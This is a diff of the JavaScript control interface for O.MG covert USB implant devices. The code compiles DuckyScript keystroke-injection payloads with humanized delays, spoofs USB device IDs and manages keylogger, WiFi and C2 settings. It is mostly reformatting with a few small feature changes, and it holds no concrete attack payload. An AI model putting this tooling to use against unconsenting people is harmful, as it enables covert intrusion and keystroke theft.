 		function apiResponseCO(data) {
-			const {
-				response,
-				parameters
-			} = parseData(data);
-
+			const { response, parameters } = parseData(data);
+		
 			toggleModalVisibility(true);
-
+		
 			const isSuccess = params[1] === "ok";
 			const modalLabel = isSuccess ? "Calibration Success" : "Calibration Failed";
 			const modalMessage = isSuccess ?
 				`Calibration Succeeded. Please unplug and replug your O.MG Device to apply configuration.` :
 				`Log Data: <${params}>`;
-
+		
 			setElementInnerHTML("modalLabel", modalLabel);
 			setElementInnerHTML("modalMessage", modalMessage);
-
+		
 			if (isSuccess) {
 				logMessage(`INFO`, `Calibration Succeeded. Please unplug and replug your O.MG Cable to apply configuration. Response: ${params}`);
 				sendMessage(`CR1`);
 			} else {
 				logMessage(`INFO`, `Calibration Failed. Response: ${params}`);
 			}
-
+		
 			parameters = response.split("\t");
 			logMessage(`CRIT`, `apiResponseCO: [data]:[${response}]`);
 			setElementInnerHTML("response-CO", response);
 		}
-
+		
 		let prevDataCTGet = null;
-
+		
 		function apiResponseCTGet(data) {
 			if (data === prevDataCTGet) {
 				return;
 			}
 			prevDataCTGet = data;
-
-			const {
-				response,
-				parameters
-			} = parseData(data);
+		
+			const { response, parameters } = parseData(data);
 			logMessage('CRIT', `apiResponseCTGet: [data]:[${response}]`);
-			setElementValues({
-				'response-CTGet': response
-			});
-
+			setElementValues({ 'response-CTGet': response });
+		
 			const settingKey = parameters[1];
 			const settingValue = parameters[2];
-
+		
 			const settingsMap = {
 				wifimac: 'device-CustomMACAddress',
 				uicolor: setAccentColors
 			};
-
+		
 			if (settingsMap.hasOwnProperty(settingKey)) {
 				const action = settingsMap[settingKey];
 				typeof action === 'function' ? action(settingValue) : setElementValues({
@@ -3235,57 +3193,57 @@ DELAY 2000
 				logMessage('CRIT', `CTGet does not have a handler for this setting. [key]:[${settingKey}] [value]:[${settingValue}]`);
 			}
 		}
-
+		
 		const apiResponseCV = (() => {
 			previousData = null;
-
+		
 			return (data) => {
 				if (data !== previousData) {
 					const response = data;
 					const parameters = response.split("\t");
 					logMessage(`DIAG`, `apiResponseCV: [data]:[${response}]`);
-
+		
 					viewDialog('loadingScreen', 'close');
-
+		
 					const type = parameters[2].charAt(0);
 					const model = parameters[2].charAt(1);
 					const calibrationStatus = parameters[3].charAt(0);
-
+		
 					const typeData = processType(type);
 					const modelData = processModel(model);
-
-					if (type == "a") {
+					
+					if(type == "a") {
 						activeEndLabel = "the USB-A side of your O.MG Cable";
 					} else if (type == "b") {
 						activeEndLabel = "the USB-A Plug of your O.MG UnBlocker";
 					} else if (type == "d") {
 						activeEndLabel = "your O.MG Plug";
 					} else if (type == "c" || type == "d") {
-						activeEndLabel = "the USB-C side of your O.MG Cable";
+						activeEndLabel = "the USB-C side of your O.MG Cable";				
 					} else if (type == "t") {
-						activeEndLabel = "the USB-C side of your O.MG Adapter";
+						activeEndLabel = "the USB-C side of your O.MG Adapter";				
 					} else {
 						activeEndLabel = "O.MG Device";
 					}
-
+		
 					applyFeatureFlags(type, model);
-
+		
 					if (['c', 'k', 'd', 'e'].includes(model)) {
 						toggleClass('contentSubNav_payload', 'hidden', 'visible');
 					}
-
+		
 					if (model === 'k' || model === 'e') {
 						toggleClass('contentSubNav_keylog', 'hidden', 'visible');
 					}
-
+		
 					if (calibrationStatus === '?' || calibrationStatus === '-' || calibrationStatus === 'l' || calibrationStatus === '') {
 						updateElementValue('modelText', 'ERROR', 'innerHTML');
 						contentAreaToggle('syslog');
 						toggleClass('contentSubNav_payload', 'visible', 'hidden');
 						updateElementValue('navbarAlerts', '<button onclick="viewDialog(`calibrationerror`, `open`);">Calibration Error</button>', 'innerHTML');
 						updateElementValue('device-TypeDecoded', 'O.MG Device', 'innerHTML');
-
-						if (calibrationStatus === 'l') {
+						
+						if(calibrationStatus === 'l') {
 							updateElementValue('device-CalibrationStatusDecoded', 'Legacy Calibration', 'innerHTML');
 							logMessage(`CRIT`, '! ALERT: Device calibration incompatible with new firmware. You can initiate a free calibration upgrade, or downgrade to v1 firmware.');
 							calibrationDescriptionText = 'Device calibration incompatible with new firmware. You can initiate a free calibration upgrade, or downgrade to v1 firmware. For more details please see: <a href="https://github.com/O-MG/O.MG-Firmware/wiki/Calibration-Upgrade">Calibration-Upgrade Instructions</a>';
@@ -3294,7 +3252,7 @@ DELAY 2000
 							logMessage(`CRIT`, '! ALERT: Device calibration failure. Please contact support.');
 							calibrationDescriptionText = 'Device calibration failure. Please contact support. For more details please see: <a href="https://github.com/O-MG/O.MG-Firmware/wiki#support">O.MG Support</a>';
 						}
-
+						
 						createDialog({
 							id: 'calibrationerror',
 							title: 'Calibration Error',
@@ -3312,96 +3270,60 @@ DELAY 2000
 							</form>`,
 							closeEnabled: true,
 						});
-
+		
 						featureFlags = ['global', 'syslog', 'debug'];
 						hideElementsByClass('payload', 'keylog', 'c2', 'hidx');
 						toggleFeatureFlags();
 					} else {
 						const elementIds = {
-							'response-CV': {
-								value: response,
-								method: 'value'
-							},
-							'frontend-VersionNumber': {
-								value: frontendVersionNumber,
-								method: 'innerHTML'
-							},
-							'device-VersionNumber': {
-								value: parameters[1],
-								method: 'innerHTML'
-							},
-							'device-Model': {
-								value: parameters[2].charAt(0),
-								method: 'innerHTML'
-							},
-							'device-Type': {
-								value: parameters[2].charAt(1),
-								method: 'innerHTML'
-							},
-							'device-CalibrationStatus': {
-								value: parameters[3],
-								method: 'value'
-							},
-							'device-TypeDecoded': {
-								value: typeData[0] + ' ' + modelData[0],
-								method: 'innerHTML'
-							},
-							'modelText': {
-								value: modelData[1],
-								method: 'innerHTML'
-							},
-							'device-CalibrationStatusDecoded': {
-								value: 'Good',
-								method: 'innerHTML'
-							},
+							'response-CV': { value: response, method: 'value' },
+							'frontend-VersionNumber': { value: frontendVersionNumber, method: 'innerHTML' },
+							'device-VersionNumber': { value: parameters[1], method: 'innerHTML' },
+							'device-Model': { value: parameters[2].charAt(0), method: 'innerHTML' },
+							'device-Type': { value: parameters[2].charAt(1), method: 'innerHTML' },
+							'device-CalibrationStatus': { value: parameters[3], method: 'value' },
+							'device-TypeDecoded': { value: typeData[0] + ' ' + modelData[0], method: 'innerHTML' },
+							'modelText': { value: modelData[1], method: 'innerHTML' },
+							'device-CalibrationStatusDecoded': { value: 'Good', method: 'innerHTML' },
 						};
 						setElementValues(elementIds);
 						fccID = parameters[4];
 					}
 					toggleFeatureFlags();
-
+		
 					previousData = data;
 				}
 			};
 		})();
-
+		
+		function apiResponseFSGet(data) {
+			const { response, parameters } = parseData(data);
+		
+			if (parameters[1] == "0") {
+				logMessage(`INFO`, `First Time Setup Wizard: Not Activated`);
+				viewDialog('firstTimeSetup', 'blockingOpen');
+			}
+		}
+		
 		let prevDataCWInfo = null;
-
+		
 		function apiResponseCWInfo(data) {
 			if (data === prevDataCWInfo) {
 				return;
 			}
 			prevDataCWInfo = data;
-			const {
-				response,
-				parameters
-			} = parseData(data);
+			const { response, parameters } = parseData(data);
 			logMessage(`DIAG`, `apiResponseCWInfo: [data]:[${response}]`);
-
+		
 			const elementIds = {
-				'response-CWInfo': {
-					value: response,
-					method: 'value'
-				},
-				'device-WIFIMode': {
-					value: parameters[0],
-					method: 'value'
-				},
-				'device-WIFISSID': {
-					value: parameters[2],
-					method: 'value'
-				},
-				'device-WIFIPassword': {
-					value: parameters[3],
-					method: 'value'
-				},
-				'device-WIFIChannel': {
-					value: parameters[4],
-					method: 'value'
-				},
+				'response-CWInfo': { value: response, method: 'value' },
+				'device-WIFIMode': { value: parameters[0], method: 'value' },
+				'device-WIFISSID': { value: parameters[2], method: 'value' },
+				'device-WIFIPassword': { value: parameters[3], method: 'value' },
+				'device-WIFIChannel': { value: parameters[4], method: 'value' },
 			};
 			setElementValues(elementIds);
-
+		
 			if (parameters[1] === '2') {
 				setRadioChecked('CW0');
 			} else if (parameters[1] === '1') {
@@ -3410,23 +3332,19 @@ DELAY 2000
 				setRadioChecked('CW0');
 			}
 		}
-
+		
 		let prevDataSVStatus = null;
-
 		function apiResponseSVStatus(data) {
 			if (data === prevDataSVStatus) {
 				return;
 			}
 			prevDataSVStatus = data;
-			const {
-				response,
-				parameters
-			} = parseData(data);
-
+			const { response, parameters } = parseData(data);
+		
 			logMessage(`CRIT`, `apiResponseSVStatus: [data]:[${response}]`);
-
+			
 			const jsonChunk = JSON.parse(parameters[1]);
-
+		
 			if (jsonChunk.hasOwnProperty('usb')) {
 				const usbStatus = jsonChunk.usb.state;
 				switch (usbStatus) {
@@ -3478,7 +3396,7 @@ DELAY 2000
 				const klStatus = jsonChunk.kl.state;
 				const footerNavKeylogStatus = document.getElementById('footerNavKeylogStatus');
 				const klButtonText = document.getElementById('keylogStartButton');
-
+		
 				switch (klStatus) {
 					case 'active':
 						footerNavKeylogStatus.classList.add('buttonSelected');
@@ -3494,37 +3412,28 @@ DELAY 2000
 				}
 			}
 		}
-
+		
 		let prevDataCWStatus = null;
-
+		
 		function apiResponseCWStatus(data) {
 			if (data === prevDataCWStatus) {
 				return;
 			}
 			prevDataCWStatus = data;
-			const {
-				response,
-				parameters
-			} = parseData(data);
-
+			const { response, parameters } = parseData(data);
+		
 			ipAddressSplit = parameters[2].match(/.{1,2}/g);
 			ipAddressDecimal = ipAddressSplit.reverse().map(hex => parseInt(hex, 16)).join('.');
-
+		
 			logMessage(`DEBUG`, `apiResponseCWStatus: [data]:[${response}]`);
-
+		
 			const elementIds = {
-				'response-CWStatus': {
-					value: response,
-					method: 'value'
-				},
-				'device-IPAddress': {
-					value: ipAddressDecimal,
-					method: 'innerHTML'
-				},
+				'response-CWStatus': { value: response, method: 'value' },
+				'device-IPAddress': { value: ipAddressDecimal, method: 'innerHTML' },
 			};
 			setElementValues(elementIds);
 		}
-
+		
 		function updateUSBIDs() {
 			const usbCommands = [
 				`CTSet\tusbvid\t${document.getElementById("device-USBVID").value}`,
@@ -3533,15 +3442,15 @@ DELAY 2000
 				`CTSet\tusbpro\t${document.getElementById("device-USBPRO").value}`,
 				`CTSet\tusbser\t${document.getElementById("device-USBSER").value}`
 			];
-
+		
 			sendCommands(usbCommands);
-
+		
 			logMessage(`INFO`, `! USB Device IDs Changed, Device will reboot.`);
 			logMessage(`CRIT`, `ChangeUSBDeviceIDs: [usbvid]:[${document.getElementById("device-USBVID").value}] [usbpid]:[${document.getElementById("device-USBPID").value}] [usbman]:[${document.getElementById("device-USBMAN").value}] [usbpro]:[${document.getElementById("device-USBPRO").value}] [usbser]:[${document.getElementById("device-USBSER").value}]`);
-
+		
 			sendMessage(`CR1`);
 		}
-
+		
 		function updateWifiSettings() {
 			let mode = document.getElementById("CW1").checked ? 1 : 2;
 			const wifiCommands = [
@@ -3552,23 +3461,23 @@ DELAY 2000
 				`CTSet\tdevicename\t${document.getElementById("device-name").value}`,
 				`CR1`
 			];
-
+		
 			sendCommands(wifiCommands);
-
+		
 			logMessage(`CRIT`, `ChangeWifiConfig: [cmd]:[${wifiCommands[0]}]:[${wifiCommands[1]}]`);
 			logMessage(`INFO`, `! WiFi Config Changed, Device will now reboot!`);
 		}
-
+		
 		function createLabelAndInput(labelText, commandName, idPrefix, parentId) {
 			return new Promise((resolve) => {
 				const parentElement = document.getElementById(parentId);
-
+		
 				if (!document.getElementById(`${idPrefix}${commandName}`)) {
 					const labelName = document.createElement("label");
 					labelName.htmlFor = `${idPrefix}${commandName}`;
 					labelName.innerHTML = labelText;
 					parentElement.appendChild(labelName);
-
+		
 					const inputName = document.createElement("input");
 					inputName.id = `${idPrefix}${commandName}`;
 					parentElement.appendChild(inputName);
@@ -3576,31 +3485,32 @@ DELAY 2000
 				resolve();
 			});
 		}
-
+		
 		async function generateDebugMenu() {
 			const keylogCmdHandlerList = ['LiveLogStatus', 'Status', 'CaptureMode', 'SpaceUsed', 'SpaceFree', 'DataWaiting', 'DataLost', 'LastReportID', 'NextReportID', 'USBPkts', 'USBLost', 'USBHolds', 'USBBursts'];
-
+			
 			const defaultCmdHandlerList = enabledFeatures;
-
+		
 			const mandatoryFields = ['CI', 'CV', 'CWInfo', 'CNGet', 'CWStatus', 'C2Config', 'C2Info', 'C2Status', 'C2Wipe'];
 			for (let field of mandatoryFields) {
 				await createLabelAndInput(field, field, 'response-', 'contentArea_debug');
 			}
-
+		
 			const defaultCmdPromises = defaultCmdHandlerList.map((commandName) => {
 				if (!mandatoryFields.includes(commandName)) {
 					return createLabelAndInput(commandName, commandName, 'response-', 'contentArea_debug');
 				}
 			});
-
+		
 			const keylogCmdPromises = keylogCmdHandlerList.map((commandName) => {
 				return createLabelAndInput(`Keylogger ${commandName}`, commandName, 'keylogger-', 'keyloggerStatus');
 			});
-
+		
 			await Promise.all([...defaultCmdPromises, ...keylogCmdPromises]);
 		}
-
+		
 		// Logger Module
+		let currentToast = null; // Keep track of the current toast
 		function logMessage(level, msg, toastOnly) {
 			const debugLevels = {
 				'NONE': 0,
@@ -3610,40 +3520,65 @@ DELAY 2000
 				'DIAG': 4,
 				'DEBUG': 5
 			};
+		
 			const now = new Date();
 			const datetime = `${now.toLocaleDateString()} ${now.toLocaleTimeString()} ${now.getMilliseconds().toString().padStart(3, '0')}ms`;
 			const debugLevel = document.getElementById('debugLevel').value;
-
+		
 			if (level !== "DEBUG" || level !== "NONE") {
 				document.getElementById("debuglog").innerHTML += `LOG ${level} (${datetime}): ${msg}\n`;
 			}
-
+		
 			if (debugLevels[level] <= debugLevels[debugLevel] && level !== "NONE") {
 				document.getElementById("syslog").innerHTML += `[${level}]\t${msg}\n`;
-
+		
 				if (level === "INFO" && !msg.includes("onMessage")) {
-					const toast = document.createElement('div');
-					toast.className = 'toast';
-
-					toast.innerHTML = toastOnly || msg;
-
-					const removeToast = () => {
-						if (document.body.contains(toast)) {
-							document.body.removeChild(toast);
-						}
-					};
-
-					const timeoutId = setTimeout(removeToast, 3000);
-					toast.onclick = () => {
-						clearTimeout(timeoutId);
-						removeToast();
-					};
-
-					document.body.appendChild(toast);
+					const displayMessage = toastOnly || msg;
+		
+					if (currentToast && document.body.contains(currentToast)) {
+						// Update existing toast
+						currentToast.innerHTML = displayMessage;
+						
+						// Refresh the toast's z-index to bring it to front
+						currentToast.style.zIndex = zIndexCounter++;
+						
+						// Reset the timeout
+						clearTimeout(currentToast.timeoutId);
+						currentToast.timeoutId = setTimeout(() => {
+							if (document.body.contains(currentToast)) {
+								document.body.removeChild(currentToast);
+								currentToast = null;
+							}
+						}, 3000);
+					} else {
+						// Create new toast
+						const toast = document.createElement('div');
+						toast.className = 'toast';
+						toast.innerHTML = displayMessage;
+						toast.style.zIndex = zIndexCounter++;
+		
+						const removeToast = () => {
+							if (document.body.contains(toast)) {
+								document.body.removeChild(toast);
+								currentToast = null;
+							}
+						};
+		
+						const timeoutId = setTimeout(removeToast, 3000);
+						toast.timeoutId = timeoutId; // Store the timeout ID on the toast element
+						
+						toast.onclick = () => {
+							clearTimeout(timeoutId);
+							removeToast();
+						};
+		
+						document.body.appendChild(toast);
+						currentToast = toast;
+					}
 				}
 			}
 		}
-
+		
 		// Payload Module
 		function apiResponseCE(data) {}
 		previousData = '';
@@ -3657,12 +3592,15 @@ DELAY 2000
 		var defaultCharDelay = "0";
 		var defaultCharDelayJitter = "0";
 		var compileFailed = "0";
-
+		
 		function getPayload() {
-			const payloadElement = document.getElementById("payload");
-			return unescapeHtml(payloadElement.value);
+			payloadElement = document.getElementById("payload");
+			unescapedPayloadElement = unescapeHtml(payloadElement.value);
+			randomDelay = Math.floor(Math.random() * 100) + 1;
+			unescapedPayloadElement += `\nDELAY ${randomDelay}`;
+			return unescapedPayloadElement;
 		}
-
+		
 		function processPayload(payload) {
 			updateLineNumbers();
 			let originalPayload = payload;
@@ -3690,9 +3628,9 @@ DELAY 2000
 				throw err;
 			}
 		}
-
+		
 		const SPECIAL_COMMANDS = new Set(["DEFINE", "FUNCTION", "IF_NOTPRESENT", "IF_PRESENT", "WAIT_FOR_NOTPRESENT", "WAIT_FOR_PRESENT", "STRING", "STRINGLN", "CTRL", "LCTRL", "LEFT-CTRL", "CONTROL", "LCONTROL", "LEFT-CONTROL", "SHIFT", "LSHIFT", "LEFT-SHIFT", "ALT", "LALT", "LEFT-ALT", "OPT", "LOPT", "LEFT-OPT", "OPTION", "LOPTION", "LEFT-OPTION", "CMD", "LCMD", "LEFT-CMD", "COMMAND", "LCOMMAND", "LEFT-COMMAND", "GUI", "LGUI", "LEFT-GUI", "WIN", "LWIN", "LEFT-WIN", "WINDOWS", "LWINDOWS", "LEFT-WINDOWS", "META", "LMETA", "LEFT-META", "SUPER", "LSUPER", "LEFT-SUPER", "RCTRL", "RIGHT-CTRL", "RCONTROL", "RIGHT-CONTROL", "RSHIFT", "RIGHT-SHIFT", "RALT", "RIGHT-ALT", "ROPT", "RIGHT-OPT", "ROPTION", "RIGHT-OPTION", "RCMD", "RIGHT-CMD", "RCOMMAND", "RIGHT-COMMAND", "RGUI", "RIGHT-GUI", "RWIN", "RIGHT-WIN", "RWINDOWS", "RIGHT-WINDOWS", "RMETA", "RIGHT-META", "RSUPER", "RIGHT-SUPER"]);
-
+		
 		function normalizeCommands(payload) {
 			return payload.split('\n').map(line => {
 				let [command, ...rest] = line.split(' ');
@@ -3702,17 +3640,17 @@ DELAY 2000
 				return [command.toUpperCase(), ...rest].join(' ');
 			}).join('\n');
 		}
-
+		
 		function runDuckyScriptByLine() {
 			payloadCompiled = compileDuckyScriptByLine();
 		}
-
+		
 		function compileDuckyScriptByLine() {
 			let payloadScript = getPayload();
 			let payloadLines = payloadScript.split('\n');
 			let payloadCompiled = "";
 			console.log(payloadScript);
-
+		
 			for (let i = 0; i < payloadLines.length; i++) {
 				let originalLine = payloadLines[i];
 				try {
@@ -3721,7 +3659,7 @@ DELAY 2000
 					if (compiledLine !== undefined) {
 						payloadCompiled += compiledLine + '\n';
 					}
-
+		
 					console.log(`Compile Line ${i+1}: [input][${originalLine}] [output][${compiledLine}]`);
 				} catch (err) {
 					console.error(`Error on line ${i + 1}: ${originalLine}`);
@@ -3729,35 +3667,35 @@ DELAY 2000
 					throw err;
 				}
 			}
-
+		
 			payloadCompiled = payloadCompiled.replace(/\s/g, '');
 			payloadCompiled = payloadCompiled.toUpperCase();
-
+		
 			let payload1Size = document.getElementById("payload1") ? document.getElementById("payload1").value : '1';
 			let calculatedPercent = (((payloadCompiled.length / 6) / (payload1Size * 4096)) * 100).toFixed(0);
 			let payloadStoragePercent = Math.min(calculatedPercent, 100) + '%';
 			document.getElementById('payloadStorageUsedBar').style.width = payloadStoragePercent;
 			document.getElementById('payloadStoragePercent').innerHTML = payloadStoragePercent;
 			payloadCompiled = split_process(payloadCompiled);
-
+		
 			console.log(payloadCompiled);
 			return payloadCompiled;
 		}
-
+		
 		function compileDuckyScript() {
 			payloadIntermediate = "";
 			payloadScript = "";
 			payloadLines = "";
 			payloadCompiled = "";
 			line = "";
-
+		
 			payloadScript = getPayload();
 			const originalPayloadLines = payloadScript.split('\n');
 			payloadScript = processPayload(payloadScript);
-
+		
 			payloadLines = payloadScript.split('\n');
 			payloadLines = payloadLines.map(cleanInvisibles);
-
+		
 			try {
 				payloadCompiled = payloadLines.map((line, index) => {
 					try {
@@ -3779,136 +3717,136 @@ DELAY 2000
 			} catch (error) {
 				throw error;
 			}
-
+		
 			payloadCompiled = payloadCompiled.replace(/\s/g, '');
 			payloadCompiled = payloadCompiled.toUpperCase();
 			crc16 = crc16augccitt(payloadCompiled);
-
+		
 			let payload1Size = document.getElementById("payload1") ? document.getElementById("payload1").value : '1';
 			let calculatedPercent = (((payloadCompiled.length / 6) / (payload1Size * 4096)) * 100).toFixed(0);
 			let payloadStoragePercent = Math.min(calculatedPercent, 100) + '%';
 			document.getElementById('payloadStorageUsedBar').style.width = payloadStoragePercent;
 			document.getElementById('payloadStoragePercent').innerHTML = payloadStoragePercent;
 			payloadCompiled = split_process(payloadCompiled);
-
+		
 			return payloadCompiled;
 		}
-
+		
 		function sortLines(input) {
 			var lines = input.split('\n');
 			var order = ['DUCKY_LANG', 'VID', 'PID', 'MAN', 'PRO', 'SER'];
-
+		
 			lines.sort((a, b) => {
 				var aPrefix = a.split(' ')[0];
 				var bPrefix = b.split(' ')[0];
-
+		
 				var aIndex = order.indexOf(aPrefix);
 				var bIndex = order.indexOf(bPrefix);
-
+		
 				if (aIndex === -1 && bIndex === -1) return 0;
 				if (aIndex === -1) return 1;
 				if (bIndex === -1) return -1;
-
+		
 				return aIndex - bIndex;
 			});
-
+		
 			return lines.join('\n');
 		}
-
+		
 		function removeComments(payload) {
 			payload = payload.replace(/REM_BLOCK[\s\S]*?END_REM\n?/g, "");
 			payload = payload.replace(/^REM .*/gm, "");
-
+		
 			return payload.trim();
 		}
-
+		
 		function cleanInvisibles(line) {
 			return line.replace(/&nbsp;/g, ' ').trimEnd();
 		}
-
+		
 		function replaceFunctions(payload) {
 			const functionRegex = /^FUNCTION\s+([a-zA-Z0-9_]+)\((.*?)\)(?=\r?\n)([\s\S]*?)(?<=\r?\n)END_FUNCTION$/gm;
 			let match;
 			let functions = {};
-
+		
 			while ((match = functionRegex.exec(payload)) !== null) {
 				const functionName = match[1];
 				const functionParams = match[2] ? match[2].split(',').map(item => item.trim().replace(/^#/, '')) : [];
 				const functionContent = match[3];
-
+		
 				functions[functionName] = {
 					params: functionParams,
 					body: functionContent
 				};
 			}
-
+		
 			payload = payload.replace(functionRegex, '');
-
+		
 			const functionReplacer = (match, functionName, args) => {
 				if (functions[functionName] === undefined) {
 					throw new Error(`Function ${functionName} is not defined`);
 				}
-
+		
 				const argList = args.split(',').map(item => item.trim());
 				let functionBody = functions[functionName].body;
-
+		
 				functionBody = functions[functionName].params.reduce((body, param, index) => {
 					return body.replace(new RegExp('#?' + param, "g"), argList[index] || "");
 				}, functionBody);
-
+		
 				return functionBody;
 			};
-
+		
 			payload = payload.replace(/^([a-zA-Z0-9_]+)\(([^)]*)\)$/gm, functionReplacer);
 			return payload;
 		}
-
+		
 		function replaceDefines(payload) {
 			const defineRegex = /^DEFINE\s+(#?[a-zA-Z0-9_]+)\s+(.*)$/gm;
 			let match;
 			let defines = {};
-
+		
 			while ((match = defineRegex.exec(payload)) !== null) {
 				const keyName = match[1].replace(/^#/, '');
 				const keyContent = match[2];
 				defines[keyName] = keyContent;
 			}
-
+		
 			payload = payload.replace(defineRegex, '');
 			payload = payload.replace(/^\s*[\r\n]/gm, '');
-
+		
 			const keys = Object.keys(defines);
 			if (keys.length > 0) {
 				const defineReplacerRegex = new RegExp('#?(' + keys.join('|') + ')', 'g');
-
+		
 				const defineReplacer = (match) => defines[match.replace(/^#/, '')] || match;
 				payload = payload.replace(defineReplacerRegex, defineReplacer);
 			}
 			return payload;
 		}
-
+		
 		function replaceRepeat(payload) {
 			const lines = payload.split('\n');
 			let newLines = [];
-
+		
 			lines.forEach(line => {
 				if (line.startsWith("REPEAT")) {
 					let splitLine = line.split(' ');
 					let count = parseInt(splitLine[1]);
 					let command = splitLine.slice(2).join(' ');
-
+		
 					newLines.push(...Array(count).fill(command));
 				} else {
 					newLines.push(line);
 				}
 			});
-
+		
 			return newLines.join('\n');
 		}
-
+		
 		function replaceBlocksWithLines(payload) {
 			const blockRegex = /^(\w+)_BLOCK\n([\s\S]*?)\nEND_\1/gm;
-
+		
 			let match;
 			while ((match = blockRegex.exec(payload)) !== null) {
 				const command = match[1];
@@ -3916,18 +3854,18 @@ DELAY 2000
 				const lines = blockContent.split('\n');
 				const replacedLines = lines.map(line => `${command} ${line}`);
 				const replacedBlock = replacedLines.join('\n');
-
+		
 				payload = payload.replace(match[0], replacedBlock);
 			}
 			return payload;
 		}
-
+		
 		function applyDelays(payload) {
 			const lines = payload.split('\n');
 			let defaultDelay = null;
 			let defaultDelayJitter = 0;
 			let newLines = [];
-
+		
 			lines.forEach(line => {
 				if (line.startsWith("DEFAULT_DELAY ")) {
 					defaultDelay = line.split(" ")[1];
@@ -3943,15 +3881,15 @@ DELAY 2000
 					}
 				}
 			});
-
+		
 			return newLines.join('\n');
 		}
-
+		
 		function duckyscriptToBytecodeConverter(line) {
 			let splitLine = line.split(' ');
 			let cmd = splitLine[0];
 			let args = splitLine.slice(1);
-
+		
 			switch (cmd) {
 				case 'IF_PRESENT':
 				case 'IF_NOTPRESENT':
@@ -4047,55 +3985,52 @@ DELAY 2000
 			}
 			return line;
 		}
-
+		
 		const ceBuildPayload = (ceBuffer) => {
 			return ceBuffer.split('').map(key => ceBuildPayloadPart(key)).join('');
 		};
-
+		
 		const ceBuildPayloadPart = (key) => {
 			const [mod, hid] = memoizedKeyToHidMapping(key);
 			let payloadPart = '';
-
+		
 			if (defaultCharDelay >= 1) {
 				const humanized = getHumanized(defaultCharDelay, defaultCharDelayJitter);
 				logMessage('CRIT', `Default Char Delay Set. [delay]:[${defaultCharDelay}] [jitter]:[${defaultCharDelayJitter}] [result]:[${humanized}]`);
 				payloadPart += `1D${toHex(humanized / 10, 4)}`;
 			}
-
+		
 			return payloadPart + `${padHex(1)}${padHex(mod)}${padHex(hid)}`;
 		};
-
+		
 		const getHumanized = (delay, jitter) => jitter >= 1 ? delay + Math.floor(Math.random() * jitter) : delay;
-
+		
 		function split_process(hexPayload) {
 			const payloadMaxSize = 1008;
 			const operations = Math.ceil(hexPayload.length / payloadMaxSize);
 			const split_payloads = [];
-
+		
 			for (let i = 0; i < operations; i++) {
 				const parsement = hexPayload.substr(i * payloadMaxSize, payloadMaxSize);
 				const this_sof = '20' + toHex(i + 1) + toHex(operations);
 				const this_eof = '30' + toHex(i + 1) + toHex(operations);
 				split_payloads.push(this_sof + parsement + this_eof);
 			}
-
+		
 			logMessage(`CRIT`, `split_process: [split_payloads]:[${split_payloads}]`);
 			return split_payloads;
 		}
-
+		
 		let ceStatusInterval;
 		const apiResponseCEStatus = (function() {
 			return function(data) {
-				const {
-					response,
-					parameters
-				} = parseData(data);
+				const { response, parameters } = parseData(data);
 				toggleClassBasedOnStatus('footerNavPayloadRun', 'buttonRunning', parameters[1], "Running");
-
+		
 				let payloadRunPercent = (((parameters[3]) / (parameters[2])) * 100).toFixed(0) + '%';
 				document.getElementById('payloadRunPercentBar').style.width = payloadRunPercent;
 				document.getElementById('payloadRunPercent').innerHTML = payloadRunPercent;
-
+		
 				if (parameters[1] === "Loading" || parameters[1] === "Running") {
 					document.getElementById(`payloadStorage`).classList.add(`hidden`);
 					document.getElementById(`payloadRun`).classList.remove(`hidden`);
@@ -4118,34 +4053,28 @@ DELAY 2000
 						ceStatusInterval = null;
 					}
 				}
-
+		
 				logMessage('CRIT', `apiResponseCEStatus: [status]:[${data}]`);
 			};
 		})();
-
+		
 		// CEStore
 		function apiResponseCEStore(data) {
 			viewDialog('payloadsaving', 'remove');
 		}
-
-
+		
+		
 		// Mode Toggles
 		function apiResponseCJ(data) {
-			const {
-				response,
-				parameters
-			} = parseData(data);
+			const { response, parameters } = parseData(data);
 			logMessage(`CRIT`, `apiResponseCJ: [data]:[${response}]`);
 			output = document.getElementById('response-CJ');
 			output.value = `${response}`;
 		}
-
+		
 		// Bootscript
 		function apiResponseStatusBootSlot(data) {
-			const {
-				response,
-				parameters
-			} = parseData(data);
+			const { response, parameters } = parseData(data);
 			if (parameters.toString().charCodeAt(0) == 0o1) {
 				document.getElementById(`toggle-slotSaveBoot`).classList.add(`active`);
 				document.getElementById(`toggle-slotLoadBoot`).classList.add(`active`);
@@ -4154,7 +4083,7 @@ DELAY 2000
 				document.getElementById(`toggle-slotLoadBoot`).classList.remove(`active`);
 			}
 		}
-
+		
 		function payloadSetBootSlot(mode) {
 			if (mode == "on") {
 				sendMessage(`CTSet\tbootscript\tbootscript`);
@@ -4163,13 +4092,13 @@ DELAY 2000
 			}
 			sendMessage(`CTList`);
 		}
-
+		
 		function payloadSlotPair(slotValue) {
 			var payloadSlotPair = `CTSet\tbootpair\t${slotValue}`;
 			sendMessage(payloadSlotPair);
 			sendMessage(`CTList`);
 		}
-
+		
 		// Payload Load
 		function sendFlashReadCommands(iterations, slotAddress) {
 			for (let i = 0; i < iterations; i++) {
@@ -4180,9 +4109,9 @@ DELAY 2000
 				sleep(50);
 			}
 		}
-
+		
 		function payloadSlotLoad(slotValue) {
-			if (slotValue == "") {
+			if(slotValue == "") {
 				return;
 			}
 			createDialog({
@@ -4193,10 +4122,10 @@ DELAY 2000
 			});
 			payloadEditorFilename = document.getElementById(`payloadEditorFilename`);
 			payloadEditorFilename.innerHTML = slotValue;
-
+		
 			payloadSaveMenuInput = document.getElementById(`payloadSelect`);
 			payloadSaveMenuInput.value = slotValue;
-
+		
 			splitPayload = [];
 			splitPayloadCounter = 0;
 			const slotElement = document.getElementById(slotValue);
@@ -4204,21 +4133,21 @@ DELAY 2000
 			const payloadSlotAddress = parseInt(payloadSlotBlocks) * blockSize;
 			const payloadSlotSize = parseInt(slotElement.value) * (blockSize / readSize);
 			const iterations = parseInt(payloadSlotSize, 10);
-
+		
 			sendFlashReadCommands(iterations, payloadSlotAddress);
 		}
-
+		
 		function loadUserPayload(splitPayload) {
 			const payloadElement = document.getElementById("payload");
 			let endIndex = splitPayload.length;
-
+		
 			for (let i = 0; i < splitPayload.length; i++) {
 				if (splitPayload.charCodeAt(i) === 0 || splitPayload.charCodeAt(i) === 255 || splitPayload.charAt(i) === "�") {
 					endIndex = i;
 					break;
 				}
 			}
-
+		
 			payloadElement.value = splitPayload.slice(0, endIndex);
 			logMessage(`INFO`, `! LOADING USER PAYLOAD`);
 			viewDialog('payloadloading', 'remove');
@@ -4226,13 +4155,10 @@ DELAY 2000
 			payloadFileMenuButton = document.getElementById(`footerNavPayloadMenu`);
 			payloadFileMenuButton.classList.remove('buttonSelectedGrey');
 		}
-
+		
 		function apiResponsePayloadLoad(data) {
-			const {
-				response,
-				parameters
